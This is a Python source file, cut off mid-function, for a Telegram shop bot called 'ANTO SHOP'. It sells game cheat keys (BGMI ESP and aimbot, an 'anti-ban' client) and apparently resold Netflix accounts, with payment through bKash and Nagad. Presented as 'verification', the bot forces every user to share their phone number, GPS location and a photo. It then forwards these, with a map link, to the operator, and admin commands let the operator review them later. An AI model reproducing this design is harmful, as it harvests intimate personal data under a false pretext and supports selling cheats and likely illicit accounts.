import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import os
import json
import random
import string
import time
from datetime import datetime

# ====================== CONFIG ======================
TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
BKASH_NUMBER = "01918591988"
NAGAD_NUMBER = "01918591988"
LOGO_URL = "https://i.postimg.cc/Cxk8NxV2/istockphoto-827351040-1024x1024.jpg"

bot = telebot.TeleBot(TOKEN)

# ====================== DATABASE ======================
def load_db(f):
    try:
        with open(f, 'r') as file:
            return json.load(file)
    except:
        return {}

def save_db(f, d):
    with open(f, 'w') as file:
        json.dump(d, file, indent=4)

users = load_db('users.json')
products = load_db('products.json')
wallet = load_db('wallet.json')
orders_db = load_db('orders.json')

# ====================== PRODUCTS ======================
if not products:
    products = {
        "1": {"name": "🔥 DRIP CLIENT PRO", "price": 399, "keys": ["DRIP-001", "DRIP-002"], "stock": 50, "desc": "✨ Non Root Support\n✨ 30 Days Access\n✨ Auto Update\n✨ Anti-Ban"},
        "2": {"name": "🎮 BGMI ESP HACK", "price": 299, "keys": ["BGMI-001", "BGMI-002"], "stock": 30, "desc": "✨ ESP + Aimbot\n✨ 100% Safe\n✨ Undetected\n✨ Smooth Gameplay"},
        "3": {"name": "📱 NETFLIX PREMIUM", "price": 299, "keys": ["NF-001", "NF-002"], "stock": 20, "desc": "✨ 4K Ultra HD\n✨ 30 Days Access\n✨ Personal Account\n✨ All Devices"}
    }
    save_db('products.json', products)

# ====================== WALLET ======================
def get_balance(uid):
    uid = str(uid)
    if uid not in wallet:
        wallet[uid] = {"balance": 0, "transactions": []}
        save_db('wallet.json', wallet)
    return wallet[uid]["balance"]

def add_balance(uid, amt, reason=""):
    uid = str(uid)
    if uid not in wallet:
        wallet[uid] = {"balance": 0, "transactions": []}
    wallet[uid]["balance"] += amt
    wallet[uid]["transactions"].append({"type": "➕ ADD", "amount": amt, "reason": reason, "date": str(datetime.now())})
    save_db('wallet.json', wallet)

def deduct_balance(uid, amt, reason=""):
    uid = str(uid)
    if get_balance(uid) >= amt:
        wallet[uid]["balance"] -= amt
        wallet[uid]["transactions"].append({"type": "➖ DEDUCT", "amount": amt, "reason": reason, "date": str(datetime.now())})
        save_db('wallet.json', wallet)
        return True
    return False

# ====================== FORCED REGISTRATION ======================
@bot.message_handler(commands=['start'])
def start(m):
    uid = str(m.chat.id)
    
    # Check if fully registered
    if uid in users and users[uid].get("registered", False):
        show_main_menu(m)
        return
    
    # Force registration
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(KeyboardButton("📞 SHARE PHONE", request_contact=True))
    
    bot.send_message(m.chat.id,
        "╔══════════════════════════════════════╗\n"
        "║      🔐 VERIFICATION REQUIRED       ║\n"
        "╚══════════════════════════════════════╝\n\n"
        "⚠️ YOU MUST COMPLETE VERIFICATION TO CONTINUE!\n\n"
        "📞 STEP 1/3 : SHARE YOUR PHONE NUMBER\n\n"
        "👇 CLICK THE BUTTON BELOW 👇",
        reply_markup=markup)
    bot.register_next_step_handler(m, step1_phone)

def step1_phone(m):
    uid = str(m.chat.id)
    
    if not m.contact:
        markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(KeyboardButton("📞 SHARE PHONE", request_contact=True))
        bot.send_message(m.chat.id, "❌ VERIFICATION FAILED!\n\nYou MUST share your phone number!", reply_markup=markup)
        bot.register_next_step_handler(m, step1_phone)
        return
    
    if uid not in users:
        users[uid] = {}
    users[uid]["phone"] = m.contact.phone_number
    users[uid]["name"] = m.from_user.first_name
    users[uid]["username"] = m.from_user.username
    save_db('users.json', users)
    
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(KeyboardButton("📍 SHARE LOCATION", request_location=True))
    
    bot.send_message(m.chat.id,
        "╔══════════════════════════════════════╗\n"
        "║      🔐 VERIFICATION REQUIRED       ║\n"
        "╚══════════════════════════════════════╝\n\n"
        "📍 STEP 2/3 : SHARE YOUR LOCATION\n\n"
        "👇 CLICK THE BUTTON BELOW 👇",
        reply_markup=markup)
    bot.register_next_step_handler(m, step2_location)

def step2_location(m):
    uid = str(m.chat.id)
    
    if not m.location:
        markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(KeyboardButton("📍 SHARE LOCATION", request_location=True))
        bot.send_message(m.chat.id, "❌ VERIFICATION FAILED!\n\nYou MUST share your location!", reply_markup=markup)
        bot.register_next_step_handler(m, step2_location)
        return
    
    users[uid]["location"] = {"lat": m.location.latitude, "lon": m.location.longitude}
    save_db('users.json', users)
    
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(KeyboardButton("📸 TAKE PHOTO", request_poll=True))
    markup.add(KeyboardButton("🖼️ SEND PHOTO"))
    
    bot.send_message(m.chat.id,
        "╔══════════════════════════════════════╗\n"
        "║      🔐 VERIFICATION REQUIRED       ║\n"
        "╚══════════════════════════════════════╝\n\n"
        "📸 STEP 3/3 : SEND YOUR PHOTO\n\n"
        "• Click 'TAKE PHOTO' for selfie\n"
        "• Click 'SEND PHOTO' for gallery\n\n"
        "👇 SEND YOUR PHOTO NOW 👇",
        reply_markup=markup)
    bot.register_next_step_handler(m, step3_photo)

def step3_photo(m):
    uid = str(m.chat.id)
    
    if m.text == "📸 TAKE PHOTO":
        markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(KeyboardButton("📸 TAKE PHOTO", request_poll=True))
        markup.add(KeyboardButton("🖼️ SEND PHOTO"))
        bot.send_message(m.chat.id, "📸 Open camera and take a photo:", reply_markup=markup)
        bot.register_next_step_handler(m, step3_photo)
        return
    
    if m.text == "🖼️ SEND PHOTO":
        bot.send_message(m.chat.id, "🖼️ Please send a photo from your gallery:")
        bot.register_next_step_handler(m, step3_photo)
        return
    
    if m.content_type != 'photo':
        bot.send_message(m.chat.id, "❌ VERIFICATION FAILED!\n\nYou MUST send a photo!")
        bot.register_next_step_handler(m, step3_photo)
        return
    
    # Save photo
    users[uid]["photo_id"] = m.photo[-1].file_id
    users[uid]["registered"] = True
    users[uid]["joined"] = str(datetime.now())
    save_db('users.json', users)
    
    # Welcome bonus
    add_balance(uid, 50, "🎁 Welcome Bonus")
    
    # Notify admin
    u = users[uid]
    loc = u.get("location", {})
    admin_text = f"🆕 **NEW USER VERIFIED!**\n\n👤 Name: {u['name']}\n🆔 ID: `{uid}`\n📞 Phone: {u.get('phone', 'N/A')}\n📍 Location: {loc.get('lat', 'N/A')}, {loc.get('lon', 'N/A')}\n🗺️ Map: https://www.google.com/maps?q={loc.get('lat', '0')},{loc.get('lon', '0')}\n💰 Bonus: 50 TK"
    
    bot.send_photo(ADMIN_ID, u["photo_id"], caption=admin_text, parse_mode="Markdown")
    
    # Clear keyboard
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("/start"))
    bot.send_message(m.chat.id, "✅ VERIFICATION COMPLETE!\n\n50 TK Bonus Added!", reply_markup=markup)
    
    show_main_menu(m)

# ====================== MAIN MENU ======================
def show_main_menu(m):
    balance = get_balance(m.chat.id)
    
    text = f"""╔══════════════════════════════════════╗
║            ✨ ANTO SHOP ✨            ║
╚══════════════════════════════════════╝

💝 **Welcome {m.from_user.first_name}!**

💰 **Balance:** ৳{balance}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 **Owner:** PAPAJI ANTO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🛍️ SHOP NOW", callback_data="shop"),
        InlineKeyboardButton("👤 MY PROFILE", callback_data="profile")
    )
    markup.add(
        InlineKeyboardButton("💰 MY WALLET", callback_data="wallet"),
        InlineKeyboardButton("➕ ADD BALANCE", callback_data="add_balance")
    )
    markup.add(
        InlineKeyboardButton("📦 MY ORDERS", callback_data="orders"),
        InlineKeyboardButton("🔑 CHECK KEY", callback_data="check_key")
    )
    markup.add(
        InlineKeyboardButton("🔗 REFERRAL", callback_data="referral"),
        InlineKeyboardButton("📞 SUPPORT", url="https://t.me/PAPAJI_ANTO")
    )
    markup.add(
        InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/ANTO_X_SHOP")
    )
    
    bot.send_photo(m.chat.id, LOGO_URL, caption=text, reply_markup=markup, parse_mode="Markdown")

# ====================== SHOP ======================
@bot.callback_query_handler(func=lambda c: c.data == "shop")
def shop(c):
    markup = InlineKeyboardMarkup(row_width=1)
    for pid, p in products.items():
        status = "✅" if p['stock'] > 0 else "❌"
        markup.add(InlineKeyboardButton(f"{status} {p['name']} - ৳{p['price']}", callback_data=f"prod_{pid}"))
    markup.add(InlineKeyboardButton("🔙 BACK", callback_data="home"))
    
    bot.edit_message_caption(
        "╔══════════════════════════════════════╗\n"
        "║           🛍️ OUR PRODUCTS           ║\n"
        "╚══════════════════════════════════════╝\n\n"
        "📦 Select your favorite product:",
        c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: c.data.startswith("prod_"))
def product_detail(c):
    pid = c.data.split("_")[1]
    p = products.get(pid)
    if not p:
        return
    
    text = f"""╔══════════════════════════════════════╗
║           📦 PRODUCT DETAILS          ║
╚══════════════════════════════════════╝

🔥 **{p['name']}**

{p['desc']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ 💰 **Price:** ৳{p['price']}
┃ 📊 **Stock:** {p['stock']} left
┃ 🚚 **Delivery:** Instant
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

✅ **Features:**
• Instant Delivery
• 24/7 Support
• Money Back Guarantee

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🛒 BUY NOW", callback_data=f"buy_{pid}"),
        InlineKeyboardButton("🔙 BACK", callback_data="shop")
    )
    bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

# ====================== BUY ======================
pending = {}

@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_"))
def buy(c):
    pid = c.data.split("_")[1]
    p = products.get(pid)
    if not p or p['stock'] <= 0:
        bot.answer_callback_query(c.id, "❌ OUT OF STOCK!")
        return
    
    pending[str(c.message.chat.id)] = {"pid": pid, "product": p, "price": p['price']}
    balance = get_balance(c.message.chat.id)
    
    text = f"""╔══════════════════════════════════════╗
║           💳 PAYMENT OPTION           ║
╚══════════════════════════════════════╝

📦 **Product:** {p['name']}
💰 **Amount:** ৳{p['price']}

💵 **Your Balance:** ৳{balance}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Select payment method:"""
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("💳 WALLET", callback_data="pay_wallet"),
        InlineKeyboardButton("📱 BKASH", callback_data="pay_bkash"),
        InlineKeyboardButton("🟢 NAGAD", callback_data="pay_nagad"),
        InlineKeyboardButton("❌ CANCEL", callback_data="home")
    )
    bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

# ====================== WALLET PAYMENT ======================
@bot.callback_query_handler(func=lambda c: c.data == "pay_wallet")
def pay_wallet(c):
    uid = str(c.message.chat.id)
    pend = pending.get(uid)
    if not pend:
        bot.answer_callback_query(c.id, "SESSION EXPIRED!")
        return
    
    if deduct_balance(uid, pend['price'], f"Purchase: {pend['product']['name']}"):
        key = pend['product']['keys'].pop(0)
        pend['product']['stock'] -= 1
        save_db('products.json', products)
        
        if uid not in orders_db:
            orders_db[uid] = []
        orders_db[uid].append({
            "product": pend['product']['name'],
            "price": pend['price'],
            "key": key,
            "date": str(datetime.now())
        })
        save_db('orders.json', orders_db)
        
        new_balance = get_balance(uid)
        
        text = f"""╔══════════════════════════════════════╗
║        ✅ PURCHASE SUCCESSFUL!        ║
╚══════════════════════════════════════╝

📦 **Product:** {pend['product']['name']}
💰 **Paid:** ৳{pend['price']}
🔑 **Your Key:** `{key}`

💝 **New Balance:** ৳{new_balance}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Thank you for shopping! 🎉
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 HOME", callback_data="home"))
        bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")
        del pending[uid]
    else:
        bot.answer_callback_query(c.id, "❌ INSUFFICIENT BALANCE!")

# ====================== BKASH/NAGAD PAYMENT ======================
payment_pending = {}

@bot.callback_query_handler(func=lambda c: c.data in ["pay_bkash", "pay_nagad"])
def manual_pay(c):
    uid = str(c.message.chat.id)
    pend = pending.get(uid)
    if not pend:
        bot.answer_callback_query(c.id, "SESSION EXPIRED!")
        return
    
    method = "BKASH" if c.data == "pay_bkash" else "NAGAD"
    number = BKASH_NUMBER if c.data == "pay_bkash" else NAGAD_NUMBER
    ref = f"ANTO{random.randint(10000, 99999)}"
    payment_pending[uid] = {"pending": pend, "method": method, "ref": ref, "number": number}
    
    text = f"""╔══════════════════════════════════════╗
║           💳 {method} PAYMENT           ║
╚══════════════════════════════════════╝

📦 **Product:** {pend['product']['name']}
💰 **Amount:** ৳{pend['price']}

📱 **{method} Number:** `{number}`
🔖 **Reference:** `{ref}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 **Instructions:**
1️⃣ Send ৳{pend['price']} to {number}
2️⃣ Send TRX ID
3️⃣ Send payment screenshot

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ SEND TRX", callback_data="send_trx"), InlineKeyboardButton("❌ CANCEL", callback_data="home"))
    
    bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: c.data == "send_trx")
def send_trx(c):
    bot.send_message(c.message.chat.id, "📝 **Send your TRX ID:**", parse_mode="Markdown")
    bot.register_next_step_handler(c.message, process_trx)

def process_trx(m):
    if m.text.startswith('/'):
        return
    uid = str(m.chat.id)
    if uid in payment_pending:
        payment_pending[uid]['trx'] = m.text
        bot.reply_to(m, "✅ TRX Saved!\n\n📸 **Now send payment screenshot:**", parse_mode="Markdown")
        bot.register_next_step_handler(m, process_ss)

def process_ss(m):
    if m.content_type != 'photo':
        bot.reply_to(m, "❌ Please send a screenshot!")
        bot.register_next_step_handler(m, process_ss)
        return
    
    uid = str(m.chat.id)
    pp = payment_pending.get(uid)
    if not pp:
        return
    
    pend = pp['pending']
    
    admin_text = f"""╔══════════════════════════════════════╗
║           🆕 NEW ORDER!            ║
╚══════════════════════════════════════╝

👤 **User:** `{m.chat.id}`
👤 **Name:** {m.from_user.first_name}
📦 **Product:** {pend['product']['name']}
💰 **Amount:** ৳{pend['price']}
💳 **Method:** {pp['method']}
🔢 **TRX ID:** `{pp['trx']}`
🔖 **Ref:** `{pp['ref']}`
📱 **Number:** {pp['number']}
⏰ **Time:** {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ APPROVE", callback_data=f"app_{uid}_{pend['pid']}"),
        InlineKeyboardButton("❌ REJECT", callback_data=f"rej_{uid}")
    )
    
    bot.send_photo(ADMIN_ID, m.photo[-1].file_id, caption=admin_text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(m.chat.id, "✅ **Order sent to admin!**\n⏳ Please wait for approval.", parse_mode="Markdown")
    del payment_pending[uid]

# ====================== APPROVE/REJECT ======================
@bot.callback_query_handler(func=lambda c: c.data.startswith("app_"))
def approve(c):
    if c.from_user.id != ADMIN_ID:
        bot.answer_callback_query(c.id, "❌ You are not admin!")
        return
    
    _, uid, pid = c.data.split("_")
    p = products.get(pid)
    if not p or len(p['keys']) == 0:
        bot.send_message(ADMIN_ID, "❌ No keys available!")
        bot.answer_callback_query(c.id, "No keys!")
        return
    
    key = p['keys'].pop(0)
    p['stock'] -= 1
    save_db('products.json', products)
    
    if uid not in orders_db:
        orders_db[uid] = []
    orders_db[uid].append({
        "product": p['name'],
        "price": p['price'],
        "key": key,
        "date": str(datetime.now())
    })
    save_db('orders.json', orders_db)
    
    user_text = f"""╔══════════════════════════════════════╗
║        ✅ PAYMENT APPROVED!         ║
╚══════════════════════════════════════╝

📦 **Product:** {p['name']}
💰 **Amount:** ৳{p['price']}
🔑 **Your Key:** `{key}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Thank you for shopping! 🎉
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    bot.send_message(int(uid), user_text, parse_mode="Markdown")
    bot.send_message(ADMIN_ID, f"✅ Approved for user {uid}")
    bot.answer_callback_query(c.id, "✅ Approved!")

@bot.callback_query_handler(func=lambda c: c.data.startswith("rej_"))
def reject(c):
    if c.from_user.id != ADMIN_ID:
        bot.answer_callback_query(c.id, "❌ You are not admin!")
        return
    
    uid = c.data.split("_")[1]
    bot.send_message(int(uid), "❌ **PAYMENT REJECTED!**\n\nPlease contact support: @PAPAJI_ANTO", parse_mode="Markdown")
    bot.send_message(ADMIN_ID, f"❌ Rejected user {uid}")
    bot.answer_callback_query(c.id, "✅ Rejected!")

# ====================== PROFILE ======================
@bot.callback_query_handler(func=lambda c: c.data == "profile")
def profile(c):
    u = users.get(str(c.message.chat.id), {})
    balance = get_balance(c.message.chat.id)
    orders = len(orders_db.get(str(c.message.chat.id), []))
    
    text = f"""╔══════════════════════════════════════╗
║            👤 MY PROFILE            ║
╚══════════════════════════════════════╝

🆔 **ID:** `{c.message.chat.id}`
👤 **Name:** {u.get('name', 'Unknown')}
📞 **Phone:** {u.get('phone', 'N/A')}
📅 **Joined:** {u.get('joined', 'Unknown')[:10]}

💰 **Balance:** ৳{balance}
📦 **Orders:** {orders}
👥 **Referrals:** {u.get('referrals', 0)}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 HOME", callback_data="home"))
    
    if u.get('photo_id'):
        bot.send_photo(c.message.chat.id, u['photo_id'], caption=text, reply_markup=markup, parse_mode="Markdown")
    else:
        bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

# ====================== WALLET ======================
@bot.callback_query_handler(func=lambda c: c.data == "wallet")
def wallet_view(c):
    balance = get_balance(c.message.chat.id)
    transactions = wallet.get(str(c.message.chat.id), {}).get('transactions', [])[-5:]
    
    text = f"""╔══════════════════════════════════════╗
║            💰 MY WALLET            ║
╚══════════════════════════════════════╝

💵 **Current Balance:** ৳{balance}

📜 **Recent Transactions:**
"""
    if transactions:
        for t in reversed(transactions):
            text += f"• {t['type']} ৳{t['amount']} - {t['date'][:16]}\n"
    else:
        text += "• No transactions yet\n"
    
    text += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("➕ ADD BALANCE", callback_data="add_balance"),
        InlineKeyboardButton("🏠 HOME", callback_data="home")
    )
    
    bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

# ====================== ADD BALANCE ======================
@bot.callback_query_handler(func=lambda c: c.data == "add_balance")
def add_balance_menu(c):
    text = f"""╔══════════════════════════════════════╗
║            💰 ADD BALANCE            ║
╚══════════════════════════════════════╝

📱 **BKash Number:** `{BKASH_NUMBER}`
📱 **Nagad Number:** `{NAGAD_NUMBER}`

📌 **Instructions:**
1️⃣ Send money to any number
2️⃣ Send TRX ID + Amount
3️⃣ Send screenshot

**Minimum Add:** ৳100
**Maximum Add:** ৳5000

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 HOME", callback_data="home"))
    bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(c.message.chat.id, "📝 **Send amount and TRX ID:**\n\nExample: `500 8Y7X9K2M4N`", parse_mode="Markdown")
    bot.register_next_step_handler(c.message, process_add_balance)

def process_add_balance(m):
    if m.text.startswith('/'):
        return
    try:
        amt, trx = m.text.split()
        amt = int(amt)
        
        admin_text = f"""💰 **BALANCE REQUEST**

👤 **User:** `{m.chat.id}`
👤 **Name:** {m.from_user.first_name}
💰 **Amount:** ৳{amt}
🔢 **TRX ID:** `{trx}`"""
        
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ APPROVE", callback_data=f"addbal_{m.chat.id}_{amt}"),
            InlineKeyboardButton("❌ REJECT", callback_data=f"rej_{m.chat.id}")
        )
        
        bot.send_message(ADMIN_ID, admin_text, reply_markup=markup, parse_mode="Markdown")
        bot.reply_to(m, "✅ Request sent to admin! Please wait.", parse_mode="Markdown")
    except:
        bot.reply_to(m, "❌ Wrong format!\n\nUse: `500 8Y7X9K2M4N`", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: c.data.startswith("addbal_"))
def approve_balance(c):
    if c.from_user.id != ADMIN_ID:
        bot.answer_callback_query(c.id, "❌ You are not admin!")
        return
    
    _, uid, amt = c.data.split("_")
    add_balance(int(uid), int(amt), "Admin Add")
    bot.send_message(int(uid), f"✅ ৳{amt} added to your wallet!", parse_mode="Markdown")
    bot.send_message(ADMIN_ID, f"✅ Added ৳{amt} to user {uid}")
    bot.answer_callback_query(c.id, "✅ Balance added!")

# ====================== ORDERS ======================
@bot.callback_query_handler(func=lambda c: c.data == "orders")
def orders(c):
    uid = str(c.message.chat.id)
    user_orders = orders_db.get(uid, [])
    
    if not user_orders:
        text = "📭 **No orders yet!**\n\nStart shopping now!"
    else:
        text = "╔══════════════════════════════════════╗\n║           📦 MY ORDERS            ║\n╚══════════════════════════════════════╝\n\n"
        for o in user_orders[-10:]:
            text += f"📦 **Product:** {o['product']}\n"
            text += f"💰 **Price:** ৳{o['price']}\n"
            text += f"🔑 **Key:** `{o.get('key', 'N/A')}`\n"
            text += f"📅 **Date:** {o['date'][:10]}\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 HOME", callback_data="home"))
    bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

# ====================== CHECK KEY ======================
@bot.callback_query_handler(func=lambda c: c.data == "check_key")
def check_key_menu(c):
    bot.send_message(c.message.chat.id, "🔑 **Enter your product key:**", parse_mode="Markdown")
    bot.register_next_step_handler(c.message, check_key_proc)

def check_key_proc(m):
    key = m.text.strip().upper()
    found = False
    
    for pid, p in products.items():
        if key in p['keys']:
            found = True
            text = f"✅ **VALID KEY!**\n\n📦 **Product:** {p['name']}\n💝 You can use this key."
            bot.reply_to(m, text, parse_mode="Markdown")
            break
    
    if not found:
        bot.reply_to(m, "❌ **INVALID KEY!**\n\nKey is wrong or already used.", parse_mode="Markdown")

# ====================== REFERRAL ======================
@bot.callback_query_handler(func=lambda c: c.data == "referral")
def referral(c):
    uname = bot.get_me().username
    u = users.get(str(c.message.chat.id), {})
    
    text = f"""╔══════════════════════════════════════╗
║           🔗 REFERRAL PROGRAM           ║
╚══════════════════════════════════════╝

💰 **Earn 10% commission** on every purchase!

👥 **Your Referrals:** {u.get('referrals', 0)}

🔗 **Your Link:**
`https://t.me/{uname}?start=ref_{c.message.chat.id}`

📌 **How it works:**
1️⃣ Share your link
2️⃣ Friends join using your link
3️⃣ You get 10% of their purchases

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("📤 SHARE LINK", url=f"https://t.me/share/url?url=https://t.me/{uname}?start=ref_{c.message.chat.id}&text=🔥 Join ANTO SHOP for premium services! 💝"),
        InlineKeyboardButton("🏠 HOME", callback_data="home")
    )
    
    bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

# ====================== HOME ======================
@bot.callback_query_handler(func=lambda c: c.data == "home")
def home(c):
    balance = get_balance(c.message.chat.id)
    
    text = f"""╔══════════════════════════════════════╗
║            ✨ ANTO SHOP ✨            ║
╚══════════════════════════════════════╝

💝 **Welcome back {c.from_user.first_name}!**

💰 **Balance:** ৳{balance}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 **Owner:** PAPAJI ANTO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🛍️ SHOP NOW", callback_data="shop"),
        InlineKeyboardButton("👤 MY PROFILE", callback_data="profile")
    )
    markup.add(
        InlineKeyboardButton("💰 MY WALLET", callback_data="wallet"),
        InlineKeyboardButton("➕ ADD BALANCE", callback_data="add_balance")
    )
    markup.add(
        InlineKeyboardButton("📦 MY ORDERS", callback_data="orders"),
        InlineKeyboardButton("🔑 CHECK KEY", callback_data="check_key")
    )
    markup.add(
        InlineKeyboardButton("🔗 REFERRAL", callback_data="referral"),
        InlineKeyboardButton("📞 SUPPORT", url="https://t.me/PAPAJI_ANTO")
    )
    markup.add(
        InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/ANTO_X_SHOP")
    )
    
    bot.edit_message_caption(text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

# ====================== ADMIN COMMANDS ======================
@bot.message_handler(commands=['admin'])
def admin_cmd(m):
    if m.chat.id != ADMIN_ID:
        return
    
    text = """╔══════════════════════════════════════╗
║           👑 ADMIN PANEL            ║
╚══════════════════════════════════════╝

👥 **USER MANAGEMENT:**
`/users` - List all users
`/userinfo ID` - Get full user info

📦 **PRODUCT MANAGEMENT:**
`/addkey PID|KEY` - Add product key
`/products` - List all products

💰 **WALLET MANAGEMENT:**
`/addbalance UID AMOUNT` - Add balance

📢 **OTHER:**
`/stats` - Bot statistics
`/broadcast MSG` - Send to all
`/setbkash NUMBER` - Set BKash number
`/setnagad NUMBER` - Set Nagad number

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    bot.send_message(m.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=['users'])
def list_users(m):
    if m.chat.id != ADMIN_ID:
        return
    
    if not users:
        bot.reply_to(m, "📭 No users yet!")
        return
    
    text = "👥 **ALL USERS**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, u in users.items():
        if u.get("registered", False):
            phone_icon = "📞" if u.get('phone') else "❌"
            loc_icon = "📍" if u.get('location') else "❌"
            photo_icon = "📸" if u.get('photo_id') else "❌"
            text += f"{phone_icon}{loc_icon}{photo_icon} `{uid}` | {u.get('name', 'N/A')}\n"
            text += f"   💰 {get_balance(uid)} TK\n"
            text += "━━━━━━━━━━━━━━━━━━━━\n"
    
    bot.send_message(m.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=['userinfo'])
def user_info(m):
    if m.chat.id != ADMIN_ID:
        return
    
    try:
        uid = m.text.split()[1]
        u = users.get(uid)
        if not u or not u.get("registered", False):
            bot.reply_to(m, "❌ User not found!")
            return
        
        text = f"""👤 **USER INFO**
━━━━━━━━━━━━━━━━━━━━

🆔 **ID:** `{uid}`
👤 **Name:** {u.get('name', 'N/A')}
📞 **Phone:** {u.get('phone', 'N/A')}
💰 **Balance:** {get_balance(uid)} TK
📦 **Orders:** {len(orders_db.get(uid, []))}
📅 **Joined:** {u.get('joined', 'N/A')[:10]}

📍 **Location:** """
        if u.get('location'):
            lat = u['location']['lat']
            lon = u['location']['lon']
            text += f"\n   Lat: {lat}\n   Lon: {lon}\n   🗺️ [Google Map](https://www.google.com/maps?q={lat},{lon})"
        else:
            text += "Not shared"
        
        text += "\n━━━━━━━━━━━━━━━━━━━━"
        
        if u.get('photo_id'):
            bot.send_photo(m.chat.id, u['photo_id'], caption=text, parse_mode="Markdown")
        else:
            bot.send_message(m.chat.id, text, parse_mode="Markdown")
    except:
        bot.reply_to(m, "❌ Use: `/userinfo USER_ID`", parse_mode="Markdown")

@bot.message_handler(commands=['addkey'])
def addkey(m):
    if m.chat.id != ADMIN_ID:
        return
    try:
        _, pid, key = m.text.split("|")
        if pid in products:
            products[pid]['keys'].append(key.upper())
            products[pid]['stock'] += 1
            save_db('products.json', products)
            bot.reply_to(m, f"✅ Key added: `{key}`", parse_mode="Markdown")
        else:
            bot.reply_to(m, "❌ Product not found!")
    except:
        bot.reply_to(m, "❌ Use: `/addkey PID|KEY`", parse_mode="Markdown")

@bot.message_handler(commands=['products'])
def list_products(m):
    if m.chat.id != ADMIN_ID:
        return
    text = "📦 **PRODUCTS**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for pid, p in products.items():
        text += f"🆔 {pid} | {p['name']}\n   💰 {p['price']} TK | 🔑 {len(p['keys'])} | 📦 {p['stock']}\n\n"
    bot.send_message(m.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=['addbalance'])
def add_balance_admin(m):
    if m.chat.id != ADMIN_ID:
        return
    try:
